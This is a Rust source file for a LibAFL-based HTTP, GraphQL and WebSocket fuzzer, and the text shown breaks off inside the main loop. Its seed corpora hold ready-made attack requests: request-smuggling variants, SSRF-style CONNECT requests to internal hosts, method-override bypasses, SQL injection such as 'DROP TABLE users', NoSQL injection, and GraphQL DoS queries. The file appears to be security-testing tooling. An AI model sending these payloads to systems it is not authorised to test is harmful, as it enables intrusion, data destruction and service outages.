// oi-fuzzer — LibAFL coverage-guided HTTP protocol fuzzer
// Targets: HTTP/1.1, GraphQL, WebSocket — request parsing edge cases + smuggling corpus
// Output: NDJSON to stdout {"type": "finding"|"corpus"|"stats", ...}
//
// Uses LibAFL 0.15 in-process fuzzer with havoc mutations.
// When the iteration budget is exhausted, emits a stats line and exits 0.

use std::path::PathBuf;
use std::time::{SystemTime, UNIX_EPOCH};

use clap::Parser;
use libafl::{
    corpus::{Corpus, InMemoryCorpus, OnDiskCorpus},
    events::SimpleEventManager,
    executors::InProcessExecutor,
    feedbacks::{CrashFeedback, MaxMapFeedback},
    fuzzer::StdFuzzer,
    inputs::{BytesInput, HasTargetBytes},
    monitors::SimpleMonitor,
    mutators::{havoc_mutations, HavocScheduledMutator},
    observers::StdMapObserver,
    schedulers::QueueScheduler,
    stages::{Stage, StdMutationalStage},
    state::{HasCorpus, StdState},
    Evaluator,
};
use libafl_bolts::{
    current_nanos,
    rands::StdRand,
    tuples::tuple_list,
    AsSlice,
};
use serde_json::json;

mod corpus_manager;
use corpus_manager::CorpusManager;

#[derive(Parser)]
#[command(author, version, about = "oi-fuzzer: LibAFL HTTP protocol fuzzer")]
struct Args {
    /// Fuzzing target (http, graphql, grpc, ws)
    #[arg(long, default_value = "http")]
    target: String,

    /// Timeout in seconds (wall-clock budget)
    #[arg(long, default_value_t = 60)]
    timeout_secs: u64,

    /// Persistent corpus directory (overrides ONEINFINITY_CORPUS_DIR env var)
    #[arg(long, default_value = "")]
    corpus_dir: String,

    /// Fuzzing strategy: structured | json_path | websocket | havoc
    #[arg(long, default_value = "havoc")]
    strategy: String,

    /// Maximum number of fuzzing iterations
    #[arg(long, default_value_t = 1000)]
    iterations: u64,
}

// ---------------------------------------------------------------------------
// Coverage map shared between executor and observer
// ---------------------------------------------------------------------------
const MAP_SIZE: usize = 65536;
static mut COVERAGE_MAP: [u8; MAP_SIZE] = [0u8; MAP_SIZE];

// ---------------------------------------------------------------------------
// HTTP/1.1 harness — simulates parsing edges and sets coverage bits
// ---------------------------------------------------------------------------
fn http_harness(input: &BytesInput) {
    let bytes = input.target_bytes();
    let data = bytes.as_slice();
    // Safety: single-threaded in-process executor; COVERAGE_MAP only written here.
    let cov: &mut [u8; MAP_SIZE] = unsafe { &mut *std::ptr::addr_of_mut!(COVERAGE_MAP) };
    cov.fill(0);

    if data.is_empty() {
        return;
    }

    let len = data.len();

    // Bit 0 — has a newline (minimal line structure)
    if data.contains(&b'\n') {
        cov[0] = 1;
    }
    // Bit 1 — looks like an HTTP method prefix
    let methods: &[&[u8]] = &[b"GET ", b"POST ", b"PUT ", b"DELETE ", b"OPTIONS ", b"HEAD ", b"CONNECT "];
    for m in methods {
        if data.starts_with(m) {
            cov[1] = 1;
            break;
        }
    }
    // Bit 2 — has HTTP/1.1 version marker
    if data.windows(8).any(|w| w == b"HTTP/1.1") {
        cov[2] = 1;
    }
    // Bits 3-5 — Transfer-Encoding header variants (smuggling surface)
    let te_variants: &[&[u8]] = &[
        b"Transfer-Encoding: chunked",
        b"Transfer-Encoding : chunked",  // space before colon
        b"Transfer-Encoding\t: chunked", // tab before colon
    ];
    for (i, te) in te_variants.iter().enumerate() {
        if data.windows(te.len()).any(|w| w == *te) {
            cov[3 + i] = 1;
        }
    }
    // Bit 6 — has Content-Length header
    if data.windows(15).any(|w| w == b"Content-Length:") {
        cov[6] = 1;
    }
    // Bit 7 — double CRLF (header/body separator)
    if data.windows(4).any(|w| w == b"\r\n\r\n") {
        cov[7] = 1;
    }
    // Bit 8 — chunked body terminator (0\r\n\r\n)
    if data.windows(5).any(|w| w == b"0\r\n\r\n") {
        cov[8] = 1;
    }
    // Bit 9 — null byte (parser confusion vector)
    if data.contains(&0x00) {
        cov[9] = 1;
    }
    // Bit 10 — over-long line (potential buffer edge)
    if len > 8192 {
        cov[10] = 1;
    }
    // Bits 11-14 — TE obfuscation patterns
    let obfuscations: &[&[u8]] = &[
        b"chunked\r\n",
        b"CHUNKED",
        b"chUnKeD",
        b"chunked, identity",
    ];
    for (i, ob) in obfuscations.iter().enumerate() {
        if data.windows(ob.len()).any(|w| w == *ob) {
            cov[11 + i] = 1;
        }
    }
    // Bit 15 — HTTP/0.9 simple request (no version, no headers)
    if data.starts_with(b"GET /") && !data.windows(8).any(|w| w == b"HTTP/1.") && !data.windows(8).any(|w| w == b"HTTP/2.") {
        cov[15] = 1;
    }
    // Bit 16 — CRLF injection in header value
    if data.windows(4).any(|w| w == b"\r\nX-") {
        cov[16] = 1;
    }
    // Bit 17 — method override header present
    if data.windows(22).any(|w| w == b"X-HTTP-Method-Override") {
        cov[17] = 1;
    }
    // Bit 18 — CONNECT method
    if data.starts_with(b"CONNECT ") {
        cov[18] = 1;
    }
    // Bit 19 — multiple Content-Length headers
    let cl_count = data.windows(15).filter(|w| *w == b"Content-Length:").count();
    if cl_count >= 2 {
        cov[19] = 1;
    }
    // Bit 20 — Transfer-Encoding: identity
    if data.windows(26).any(|w| w == b"Transfer-Encoding: identity") {
        cov[20] = 1;
    }
    // Bit 21 — GraphQL introspection
    if data.windows(10).any(|w| w == b"__schema{") || data.windows(10).any(|w| w == b"__schema {") {
        cov[21] = 1;
    }
    // Bit 22 — WebSocket upgrade
    if data.windows(19).any(|w| w == b"Upgrade: websocket\r") {
        cov[22] = 1;
    }
    // Spread length info across upper map so mutations of different sizes
    // are treated as distinct coverage.
    cov[len.min(MAP_SIZE - 1)] = cov[len.min(MAP_SIZE - 1)].saturating_add(1);
}

// ---------------------------------------------------------------------------
// Seed corpus: 50 HTTP smuggling + edge-case payloads
// ---------------------------------------------------------------------------
fn seed_corpus() -> Vec<Vec<u8>> {
    let mut seeds: Vec<Vec<u8>> = vec![
        // --- Original 20 smuggling seeds ---
        // CL.TE — Content-Length takes precedence for front-end, TE for back-end
        b"POST / HTTP/1.1\r\nHost: a\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED".to_vec(),
        // TE.CL — TE for front-end, CL for back-end
        b"POST / HTTP/1.1\r\nHost: a\r\nTransfer-Encoding: chunked\r\nContent-Length: 3\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n".to_vec(),
        // TE.TE — both use TE, obfuscation fools one
        b"POST / HTTP/1.1\r\nHost: a\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\n\r\n0\r\n\r\n".to_vec(),
        // TE header with leading whitespace (obfuscation)
        b"POST / HTTP/1.1\r\nHost: a\r\n Transfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n0\r\n\r\n".to_vec(),
        // TE header with tab before colon
        b"POST / HTTP/1.1\r\nHost: a\r\nTransfer-Encoding\t: chunked\r\nContent-Length: 4\r\n\r\n0\r\n\r\n".to_vec(),
        // TE: chunked with extra comma-value
        b"POST / HTTP/1.1\r\nHost: a\r\nTransfer-Encoding: chunked, identity\r\n\r\n0\r\n\r\n".to_vec(),
        // Uppercase TE value
        b"POST / HTTP/1.1\r\nHost: a\r\nTransfer-Encoding: CHUNKED\r\n\r\n0\r\n\r\n".to_vec(),
        // Mixed-case TE value
        b"POST / HTTP/1.1\r\nHost: a\r\nTransfer-Encoding: chUnKeD\r\n\r\n0\r\n\r\n".to_vec(),
        // Duplicate TE headers (reversed order)
        b"POST / HTTP/1.1\r\nHost: a\r\nTransfer-Encoding: identity\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n".to_vec(),
        // CL=0 with chunked body
        b"POST / HTTP/1.1\r\nHost: a\r\nContent-Length: 0\r\nTransfer-Encoding: chunked\r\n\r\n5\r\nhello\r\n0\r\n\r\n".to_vec(),
        // Null byte in Host header
        b"POST / HTTP/1.1\r\nHost: a\x00.evil.com\r\n\r\n".to_vec(),
        // Folded header (obsolete HTTP/1.1 header folding)
        b"POST / HTTP/1.1\r\nHost: a\r\nTransfer-Encoding:\r\n\tchunked\r\n\r\n0\r\n\r\n".to_vec(),
        // HTTP/1.0 with chunked (unsupported in 1.0 — parser ambiguity)
        b"POST / HTTP/1.0\r\nHost: a\r\nTransfer-Encoding: chunked\r\nContent-Length: 3\r\n\r\n0\r\n\r\n".to_vec(),
        // Very large Content-Length (overflow probe)
        b"POST / HTTP/1.1\r\nHost: a\r\nContent-Length: 99999999999999999999\r\n\r\n".to_vec(),
        // Negative Content-Length
        b"POST / HTTP/1.1\r\nHost: a\r\nContent-Length: -1\r\n\r\nBODY".to_vec(),
        // Missing CRLF between headers and body
        b"POST / HTTP/1.1\r\nHost: a\r\nContent-Length: 4\r\nBODY".to_vec(),
        // LF-only line endings (instead of CRLF)
        b"POST / HTTP/1.1\nHost: a\nContent-Length: 4\n\nBODY".to_vec(),
        // Chunked body with trailing headers and CL mismatch
        b"POST / HTTP/1.1\r\nHost: a\r\nTransfer-Encoding: chunked\r\n\r\na\r\n0123456789\r\n0\r\nContent-Length: 5\r\n\r\n".to_vec(),
        // Chunk size with extension (parsers must ignore extensions)
        b"POST / HTTP/1.1\r\nHost: a\r\nTransfer-Encoding: chunked\r\n\r\n5;ext=val\r\nhello\r\n0\r\n\r\n".to_vec(),
        // Bare minimum valid GET
        b"GET / HTTP/1.1\r\nHost: a\r\n\r\n".to_vec(),

        // --- Enhancement 3: 30 additional edge-case seeds ---

        // HTTP/0.9 simple request — no version, no headers
        b"GET /index.html\r\n".to_vec(),

        // HTTP/1.0 with Connection: keep-alive
        b"GET / HTTP/1.0\r\nHost: a\r\nConnection: keep-alive\r\n\r\n".to_vec(),

        // Null byte in path (parser confusion)
        b"GET /\x00admin HTTP/1.1\r\nHost: a\r\n\r\n".to_vec(),

        // CRLF injection in header value (response splitting attempt)
        b"GET / HTTP/1.1\r\nHost: a\r\nX-Custom: value\r\nX-Injected: evil\r\n\r\n".to_vec(),

        // 10,000 byte header value (buffer boundary probe)
        {
            let big_val = "A".repeat(10000);
            format!("GET / HTTP/1.1\r\nHost: a\r\nX-Big: {}\r\n\r\n", big_val).into_bytes()
        },

        // 200 headers (parser header count limits)
        {
            let mut req = b"GET / HTTP/1.1\r\nHost: a\r\n".to_vec();
            for i in 0..200u32 {
                req.extend_from_slice(format!("X-H{}: v\r\n", i).as_bytes());
            }
            req.extend_from_slice(b"\r\n");
            req
        },

        // Chunked body with named extension
        b"POST / HTTP/1.1\r\nHost: a\r\nTransfer-Encoding: chunked\r\n\r\n5; name=value\r\nhello\r\n0\r\n\r\n".to_vec(),

        // Multiple Content-Length headers with different values (desync)
        b"POST / HTTP/1.1\r\nHost: a\r\nContent-Length: 4\r\nContent-Length: 100\r\n\r\nBODY".to_vec(),

        // Transfer-Encoding: identity (rare, sometimes parsed differently)
        b"POST / HTTP/1.1\r\nHost: a\r\nTransfer-Encoding: identity\r\nContent-Length: 4\r\n\r\nBODY".to_vec(),

        // CONNECT to internal host (SSRF via proxy)
        b"CONNECT internal.host:8080 HTTP/1.1\r\nHost: internal.host:8080\r\n\r\n".to_vec(),

        // CONNECT with HTTP/1.0 (proxy tunneling)
        b"CONNECT 127.0.0.1:22 HTTP/1.0\r\nHost: 127.0.0.1\r\n\r\n".to_vec(),

        // X-HTTP-Method-Override to bypass method restrictions
        b"POST / HTTP/1.1\r\nHost: a\r\nX-HTTP-Method-Override: DELETE\r\nContent-Length: 0\r\n\r\n".to_vec(),

        // X-HTTP-Method to bypass method restrictions (alternate header)
        b"POST / HTTP/1.1\r\nHost: a\r\nX-HTTP-Method: PUT\r\nContent-Length: 0\r\n\r\n".to_vec(),

        // X-Method-Override (yet another variant)
        b"POST / HTTP/1.1\r\nHost: a\r\nX-Method-Override: PATCH\r\nContent-Length: 0\r\n\r\n".to_vec(),

        // HEAD request with body (some servers parse body despite HEAD semantics)
        b"HEAD / HTTP/1.1\r\nHost: a\r\nContent-Length: 10\r\n\r\nSOMEBODYXX".to_vec(),

        // OPTIONS * (server-level options, sometimes exposes allowed methods)
        b"OPTIONS * HTTP/1.1\r\nHost: a\r\n\r\n".to_vec(),

        // TRACE (often disabled; XST attack surface)
        b"TRACE / HTTP/1.1\r\nHost: a\r\n\r\n".to_vec(),

        // Absolute-form request URI (proxy request)
        b"GET http://internal.host/secret HTTP/1.1\r\nHost: internal.host\r\n\r\n".to_vec(),

        // Request with invalid HTTP version
        b"GET / HTTP/9.9\r\nHost: a\r\n\r\n".to_vec(),

        // Chunk size in hex with uppercase letters
        b"POST / HTTP/1.1\r\nHost: a\r\nTransfer-Encoding: chunked\r\n\r\nA\r\n0123456789\r\n0\r\n\r\n".to_vec(),

        // Chunk size with leading zeros
        b"POST / HTTP/1.1\r\nHost: a\r\nTransfer-Encoding: chunked\r\n\r\n005\r\nhello\r\n000\r\n\r\n".to_vec(),

        // TE: chunked with obfuscating x- prefix
        b"POST / HTTP/1.1\r\nHost: a\r\nTransfer-Encoding: x-chunked\r\nContent-Length: 4\r\n\r\n0\r\n\r\n".to_vec(),

        // Content-Length with space before value (non-standard)
        b"POST / HTTP/1.1\r\nHost: a\r\nContent-Length:  4\r\n\r\nBODY".to_vec(),

        // Semicolon in Content-Length (parser error injection)
        b"POST / HTTP/1.1\r\nHost: a\r\nContent-Length: 4;5\r\n\r\nBODY".to_vec(),

        // Double TE: chunked with CL.TE desync
        b"POST / HTTP/1.1\r\nHost: a\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: chunked\r\nContent-Length: 5\r\n\r\n0\r\n\r\n".to_vec(),

        // CR-only line endings (some parsers tolerate)
        b"POST / HTTP/1.1\rHost: a\rContent-Length: 4\r\rBODY".to_vec(),

        // Pipeline: two requests in one buffer (server-side pipeline parsing)
        b"GET / HTTP/1.1\r\nHost: a\r\n\r\nGET /admin HTTP/1.1\r\nHost: a\r\n\r\n".to_vec(),

        // Host header with port (probe port-based routing bypass)
        b"GET / HTTP/1.1\r\nHost: a:65535\r\n\r\n".to_vec(),

        // Duplicate Host headers (HTTP/2 downgrade confusion)
        b"GET / HTTP/1.1\r\nHost: a\r\nHost: evil.com\r\n\r\n".to_vec(),

        // HTTP/2 Upgrade request (h2c upgrade probe)
        b"GET / HTTP/1.1\r\nHost: a\r\nUpgrade: h2c\r\nHTTP2-Settings: AAMAAABkAAQAAP__\r\nConnection: Upgrade, HTTP2-Settings\r\n\r\n".to_vec(),
    ];

    // Ensure we always have exactly 50 seeds (pad or truncate defensively)
    seeds.truncate(50);
    seeds
}

// ---------------------------------------------------------------------------
// GraphQL injection probe corpus
// ---------------------------------------------------------------------------
fn graphql_corpus() -> Vec<Vec<u8>> {
    let mut probes: Vec<Vec<u8>> = Vec::new();

    // Introspection — reveals full schema
    probes.push(b"POST /graphql HTTP/1.1\r\nHost: a\r\nContent-Type: application/json\r\n\r\n{\"query\":\"{__schema{types{name}}}\"}\n".to_vec());
    probes.push(b"POST /graphql HTTP/1.1\r\nHost: a\r\nContent-Type: application/json\r\n\r\n{\"query\":\"{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}}\"}\n".to_vec());

    // SQL injection via args
    probes.push(b"POST /graphql HTTP/1.1\r\nHost: a\r\nContent-Type: application/json\r\n\r\n{\"query\":\"{user(id:\\\"1 OR 1=1\\\")}\"}\n".to_vec());
    probes.push(b"POST /graphql HTTP/1.1\r\nHost: a\r\nContent-Type: application/json\r\n\r\n{\"query\":\"{user(id:\\\"1; DROP TABLE users--\\\")}\"}\n".to_vec());
    probes.push(b"POST /graphql HTTP/1.1\r\nHost: a\r\nContent-Type: application/json\r\n\r\n{\"query\":\"{user(id:\\\"1' UNION SELECT 1,2,3--\\\")}\"}\n".to_vec());
    probes.push(b"POST /graphql HTTP/1.1\r\nHost: a\r\nContent-Type: application/json\r\n\r\n{\"query\":\"{users(filter:\\\"' OR '1'='1\\\"){id email password}}\"}\n".to_vec());

    // NoSQL injection
    probes.push(b"POST /graphql HTTP/1.1\r\nHost: a\r\nContent-Type: application/json\r\n\r\n{\"query\":\"{user(filter:\\\"{\\\\\\\"$where\\\\\\\": \\\\\\\"1==1\\\\\\\"}\\\")}\"}\n".to_vec());
    probes.push(b"POST /graphql HTTP/1.1\r\nHost: a\r\nContent-Type: application/json\r\n\r\n{\"query\":\"{user(filter:\\\"{\\\\\\\"$gt\\\\\\\": \\\\\\\"\\\\\\\"}\\\")}\"}\n".to_vec());
    probes.push(b"POST /graphql HTTP/1.1\r\nHost: a\r\nContent-Type: application/json\r\n\r\n{\"query\":\"{user(filter:\\\"{\\\\\\\"$regex\\\\\\\": \\\\\\\".*\\\\\\\"}\\\")}\"}\n".to_vec());

    // Batching DoS — 1000 identical queries in one request
    let batch_query = {
        let single = "{\"query\":\"{__typename}\"}";
        let queries: Vec<&str> = std::iter::repeat(single).take(1000).collect();
        let body = format!("[{}]", queries.join(","));
        format!(
            "POST /graphql HTTP/1.1\r\nHost: a\r\nContent-Type: application/json\r\nContent-Length: {}\r\n\r\n{}\n",
            body.len(),
            body
        )
        .into_bytes()
    };
    probes.push(batch_query);

    // Field suggestion bruteforce — random names to trigger helpful errors
    let field_names = [
        "admin", "users", "password", "secret", "token", "apiKey",
        "internalUsers", "debugInfo", "systemInfo", "config",
    ];
    for name in &field_names {
        let body = format!("{{\"query\":\"{{{}}}\"  }}", name);
        let probe = format!(
            "POST /graphql HTTP/1.1\r\nHost: a\r\nContent-Type: application/json\r\nContent-Length: {}\r\n\r\n{}\n",
            body.len(),
            body
        );
        probes.push(probe.into_bytes());
    }

    // Deep nesting DoS — 100 levels
    let nested_query = {
        let open: String = "a{".repeat(100);
        let close: String = "}".repeat(100);
        let query_str = format!("{{{}{}}}", open, close);
        let body = format!("{{\"query\":\"{}\"}}", query_str.replace('"', "\\\""));
        format!(
            "POST /graphql HTTP/1.1\r\nHost: a\r\nContent-Type: application/json\r\nContent-Length: {}\r\n\r\n{}\n",
            body.len(),
            body
        )
        .into_bytes()
    };
    probes.push(nested_query);

    // Alias overload (alias bombing)
    let alias_bomb = {
        let aliases: String = (0..100)
            .map(|i| format!("f{}:__typename ", i))
            .collect::<Vec<_>>()
            .join(" ");
        let body = format!("{{\"query\":\"{{{}}}\"  }}", aliases);
        format!(
            "POST /graphql HTTP/1.1\r\nHost: a\r\nContent-Type: application/json\r\nContent-Length: {}\r\n\r\n{}\n",
            body.len(),
            body
        )
        .into_bytes()
    };
    probes.push(alias_bomb);

    // Directive abuse
    probes.push(b"POST /graphql HTTP/1.1\r\nHost: a\r\nContent-Type: application/json\r\n\r\n{\"query\":\"{user(id:1) @skip(if:false) @include(if:true) @deprecated}\"}\n".to_vec());

    // Fragment cycles (may cause infinite recursion in some engines)
    probes.push(b"POST /graphql HTTP/1.1\r\nHost: a\r\nContent-Type: application/json\r\n\r\n{\"query\":\"fragment A on User{...B} fragment B on User{...A} {user{...A}}\"}\n".to_vec());

    // Variable injection
    probes.push(b"POST /graphql HTTP/1.1\r\nHost: a\r\nContent-Type: application/json\r\n\r\n{\"query\":\"query($id:ID!){user(id:$id){id email}}\",\"variables\":{\"id\":\"1 OR 1=1\"}}\n".to_vec());
    probes.push(b"POST /graphql HTTP/1.1\r\nHost: a\r\nContent-Type: application/json\r\n\r\n{\"query\":\"query($id:ID!){user(id:$id){id email}}\",\"variables\":{\"id\":{\"$gt\":\"\"}}}\n".to_vec());

    probes
}

// ---------------------------------------------------------------------------
// WebSocket upgrade probe corpus
// ---------------------------------------------------------------------------
fn websocket_corpus() -> Vec<Vec<u8>> {
    vec![
        // Standard WS upgrade (baseline)
        b"GET /ws HTTP/1.1\r\nHost: a\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\n\r\n".to_vec(),

        // WS upgrade with smuggling headers (CL.TE on upgrade)
        b"GET /ws HTTP/1.1\r\nHost: a\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\nContent-Length: 8\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED".to_vec(),

        // WS upgrade with TE.CL
        b"GET /ws HTTP/1.1\r\nHost: a\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\nTransfer-Encoding: chunked\r\nContent-Length: 3\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n".to_vec(),

        // Fragmented WebSocket frame sequence (binary opcode 0x02 + continuation 0x00)
        // Frame 1: FIN=0, opcode=2 (binary), MASK=0, payload="hel"
        // Frame 2: FIN=1, opcode=0 (continuation), MASK=0, payload="lo"
        {
            let frame1: Vec<u8> = vec![0x02, 0x03, b'h', b'e', b'l'];
            let frame2: Vec<u8> = vec![0x80, 0x02, b'l', b'o'];
            let mut upgrade = b"GET /ws HTTP/1.1\r\nHost: a\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\n\r\n".to_vec();
            upgrade.extend_from_slice(&frame1);
            upgrade.extend_from_slice(&frame2);
            upgrade
        },

        // Ping frame (opcode 0x09)
        {
            let ping: Vec<u8> = vec![0x89, 0x05, b'h', b'e', b'l', b'l', b'o'];
            let mut upgrade = b"GET /ws HTTP/1.1\r\nHost: a\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\n\r\n".to_vec();
            upgrade.extend_from_slice(&ping);
            upgrade
        },

        // Pong frame (opcode 0x0A) — unsolicited pong (protocol confusion)
        {
            let pong: Vec<u8> = vec![0x8A, 0x00];
            let mut upgrade = b"GET /ws HTTP/1.1\r\nHost: a\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\n\r\n".to_vec();
            upgrade.extend_from_slice(&pong);
            upgrade
        },

        // Protocol confusion: claim ws upgrade but send HTTP body after
        b"GET /ws HTTP/1.1\r\nHost: a\r\nUpgrade: websocket\r\nConnection: Upgrade, keep-alive\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\nContent-Length: 27\r\n\r\nGET /admin HTTP/1.1\r\nHost: a\r\n\r\n".to_vec(),

        // Upgrade header case variation (bypass case-sensitive checks)
        b"GET /ws HTTP/1.1\r\nHost: a\r\nUpgrade: WebSocket\r\nConnection: upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\n\r\n".to_vec(),

        // Invalid WebSocket version (parser robustness)
        b"GET /ws HTTP/1.1\r\nHost: a\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 999\r\n\r\n".to_vec(),

        // Missing Sec-WebSocket-Key (incomplete upgrade — how does server handle?)
        b"GET /ws HTTP/1.1\r\nHost: a\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Version: 13\r\n\r\n".to_vec(),

        // WS upgrade on POST (non-standard method)
        b"POST /ws HTTP/1.1\r\nHost: a\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\nContent-Length: 0\r\n\r\n".to_vec(),

        // Large masked WebSocket frame (DoS probe — 65535 byte payload length field)
        {
            // Extended payload: opcode=2, FIN=1, MASK=0, 16-bit extended length
            let frame: Vec<u8> = vec![0x82, 0x7E, 0xFF, 0xFF];
            let mut upgrade = b"GET /ws HTTP/1.1\r\nHost: a\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\n\r\n".to_vec();
            upgrade.extend_from_slice(&frame);
            upgrade
        },
    ]
}

// ---------------------------------------------------------------------------
// NDJSON helpers
// ---------------------------------------------------------------------------
fn now_ts() -> f64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs_f64())
        .unwrap_or(0.0)
}

fn emit_corpus(data: &[u8], target: &str) {
    let hex: String = data.iter().map(|b| format!("{:02x}", b)).collect();
    println!("{}", json!({"type": "corpus", "data": hex, "ts": now_ts(), "target": target}));
}

fn emit_stats(target: &str, iterations: u64, corpus_size: usize, elapsed_ms: u64, unique_paths: usize) {
    let ts = now_ts();
    println!(
        "{}",
        json!({
            "type": "stats",
            "target": target,
            "iterations": iterations,
            "corpus_size": corpus_size,
            "ts": ts,
            "elapsed_ms": elapsed_ms,
            "unique_paths": unique_paths
        })
    );
}

// ---------------------------------------------------------------------------
// main
// ---------------------------------------------------------------------------
fn main() {
    let args = Args::parse();
    let run_start = std::time::Instant::now();

    // Resolve corpus directory: --corpus-dir flag > ONEINFINITY_CORPUS_DIR env > default.
    let corpus_dir_str = if !args.corpus_dir.is_empty() {
        args.corpus_dir.clone()
    } else {
        std::env::var("ONEINFINITY_CORPUS_DIR").unwrap_or_else(|_| {
            let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".to_string());
            format!("{home}/.oneinfinity/corpus")
        })
    };
    let corpus_dir = PathBuf::from(&corpus_dir_str);
    let corpus_manager = CorpusManager::new(&corpus_dir);

    // Strategy flag is available for downstream routing; select harness accordingly.
    let strategy = args.strategy.as_str();

    // Dispatch target-specific corpus first — fuzzer_driver.py receives these
    // regardless of whether the LibAFL loop completes.
    let seeds: Vec<Vec<u8>> = match args.target.as_str() {
        "graphql" => graphql_corpus(),
        "ws" => websocket_corpus(),
        _ => seed_corpus(),
    };

    for seed in &seeds {
        emit_corpus(seed, &args.target);
    }

    // -----------------------------------------------------------------------
    // Build LibAFL in-process fuzzer
    // -----------------------------------------------------------------------
    let monitor = SimpleMonitor::new(|s| eprintln!("[oi-fuzzer] {s}"));
    let mut mgr = SimpleEventManager::new(monitor);

    // Observer over the static coverage map.
    // Safety: single-threaded; COVERAGE_MAP is only accessed in the harness.
    let observer = unsafe {
        StdMapObserver::from_mut_ptr("cov", std::ptr::addr_of_mut!(COVERAGE_MAP) as *mut u8, MAP_SIZE)
    };

    let mut feedback = MaxMapFeedback::new(&observer);
    let mut objective = CrashFeedback::new();

    let mut state = StdState::new(
        StdRand::with_seed(current_nanos()),
        InMemoryCorpus::<BytesInput>::new(),
        OnDiskCorpus::new("/tmp/oi-fuzzer-crashes").expect("crash corpus dir"),
        &mut feedback,
        &mut objective,
    )
    .expect("state init");

    let scheduler = QueueScheduler::new();
    let mut fuzzer = StdFuzzer::new(scheduler, feedback, objective);

    let mut harness = |input: &BytesInput| {
        // Route to appropriate harness based on strategy / target.
        let _ = strategy; // strategy available for future dispatch
        http_harness(input);
        libafl::executors::ExitKind::Ok
    };

    let mut executor = InProcessExecutor::new(
        &mut harness,
        tuple_list!(observer),
        &mut fuzzer,
        &mut state,
        &mut mgr,
    )
    .expect("executor init");

    // Load persisted corpus from disk before seeding built-in payloads.
    let persisted = corpus_manager.load();
    for entry in &persisted {
        let input = BytesInput::new(entry.clone());
        if let Err(e) = fuzzer.evaluate_input(&mut state, &mut executor, &mut mgr, &input) {
            eprintln!("[oi-fuzzer] persisted corpus eval error: {e:?}");
        }
    }

    // Load built-in seeds into corpus
    for seed in &seeds {
        let input = BytesInput::new(seed.clone());
        if let Err(e) = fuzzer.evaluate_input(&mut state, &mut executor, &mut mgr, &input) {
            eprintln!("[oi-fuzzer] seed eval error: {e:?}");
        }
    }

    let mutator = HavocScheduledMutator::new(havoc_mutations());
    let mut stage = StdMutationalStage::new(mutator);

    let timeout = std::time::Duration::from_secs(args.timeout_secs);
    let mut prev_corpus_size = state.corpus().count();

    // Track unique coverage paths: count of non-zero bytes in coverage map
    let mut unique_paths: usize = 0;
    // edge_id counter for coverage_edge events (monotonic, one per new corpus entry)
    let mut edge_id: u64 = 0;

    for iter in 0..args.iterations {
        if run_start.elapsed() >= timeout {
            eprintln!("[oi-fuzzer] timeout after {iter} iterations");
            break;
        }

        if let Err(e) = stage.perform(&mut fuzzer, &mut executor, &mut state, &mut mgr) {
            eprintln!("[oi-fuzzer] stage error: {e:?}");
            break;
        }

        // Emit any newly discovered interesting inputs
        let corpus_size = state.corpus().count();
        if corpus_size > prev_corpus_size {
            for idx in prev_corpus_size..corpus_size {
                let id = libafl::corpus::CorpusId::from(idx as u64);
                if let Ok(entry) = state.corpus().get(id) {
                    if let Ok(tc) = entry.try_borrow() {
                        if let Some(inp) = tc.input() {
                            let b = inp.target_bytes();
                            let raw = b.as_slice();
                            emit_corpus(raw, &args.target);

                            // Persist to disk and emit coverage_edge event.
                            corpus_manager.save(raw);
                            let input_hash: String = raw.iter()
                                .take(8)
                                .map(|byte| format!("{byte:02x}"))
                                .collect();
                            println!(
                                "{{\"type\":\"coverage_edge\",\"edge_id\":{edge_id},\"input_hash\":\"{input_hash}\"}}",
                            );
                            edge_id += 1;
                        }
                    }
                }
            }
            prev_corpus_size = corpus_size;
        }

        // Update unique paths estimate from coverage map snapshot
